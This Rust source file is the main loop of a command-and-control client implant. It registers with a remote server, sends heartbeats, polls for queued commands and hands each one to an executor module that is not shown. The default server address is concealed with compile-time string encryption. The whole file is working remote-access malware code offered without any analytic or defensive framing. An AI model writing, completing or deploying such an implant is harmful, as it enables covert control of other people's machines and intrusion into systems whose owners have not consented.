use reqwest::Client;
use std::time::Duration;
use tokio::time::sleep;

mod client_info;
mod command_executor;
mod gadgets;

use common::config::ClientConfig;
use common::error::C2Result;
use common::message::{CommandRequest, Message, MessageType};

/// C2 Client
pub struct C2Client {
    config: ClientConfig,
    http_client: Client,
    client_info: common::message::ClientInfo,
}

impl C2Client {
    pub async fn new(config: ClientConfig) -> C2Result<Self> {
        let client_info = client_info::build_client_info(config.client_id.clone()).await?;

        Ok(Self {
            config,
            http_client: Client::new(),
            client_info,
        })
    }

    /// Main loop for the client
    pub async fn run(&mut self) -> C2Result<()> {
        self.register().await?;
        println!("C2 Client started with ID: {}", self.client_info.id);

        loop {
            if let Err(e) = self.send_heartbeat().await {
                eprintln!("Failed to send heartbeat: {e}");
            }

            if let Err(e) = self.check_and_execute_commands().await {
                eprintln!("Failed to check commands: {e}");
            }

            sleep(Duration::from_secs(self.config.heartbeat_interval)).await;
        }
    }

    /// Register the client with the server
    async fn register(&mut self) -> C2Result<()> {
        self.client_info.last_seen = chrono::Utc::now();
        let payload = serde_json::to_vec(&self.client_info)?;
        let message = Message::new(MessageType::ClientRegister, payload);

        let res = self
            .http_client
            .post(format!("{}/api/register", self.config.server_url))
            .json(&message)
            .send()
            .await?;

        if res.status().is_success() {
            println!("Client registered successfully.");
        } else {
            return Err(common::error::C2Error::Network(format!(
                "Failed to register: {}",
                res.status()
            )));
        }
        Ok(())
    }

    /// Send a heartbeat to the server
    async fn send_heartbeat(&mut self) -> C2Result<()> {
        self.client_info.last_seen = chrono::Utc::now();
        let payload = self.client_info.id.as_bytes().to_vec();
        let message = Message::new(MessageType::Heartbeat, payload);

        self.http_client
            .post(format!("{}/api/heartbeat", self.config.server_url))
            .json(&message)
            .send()
            .await?;
        Ok(())
    }

    /// Check for and execute commands from the server
    async fn check_and_execute_commands(&self) -> C2Result<()> {
        let res = self
            .http_client
            .get(format!(
                "{}/api/commands/{}",
                self.config.server_url, self.client_info.id
            ))
            .send()
            .await?;

        if res.status().is_success() {
            let commands: Vec<CommandRequest> = res.json().await?;
            for cmd in commands {
                if let Err(e) = command_executor::execute_command(
                    &self.http_client,
                    &self.config.server_url,
                    &self.client_info.id,
                    cmd,
                )
                .await
                {
                    eprintln!("Error executing command: {e}");
                }
            }
        }
        Ok(())
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();
    let server_url = args.get(1).map(|s| s.to_string()).unwrap_or_else(|| {
        cryptify::encrypt_string!("http://localhost:8080").to_string()
    });

    let config = ClientConfig::default();
    let mut client = C2Client::new(ClientConfig {
        server_url,
        ..config
    })
    .await?; // Await the async new function
    client.run().await?;
    Ok(())
}
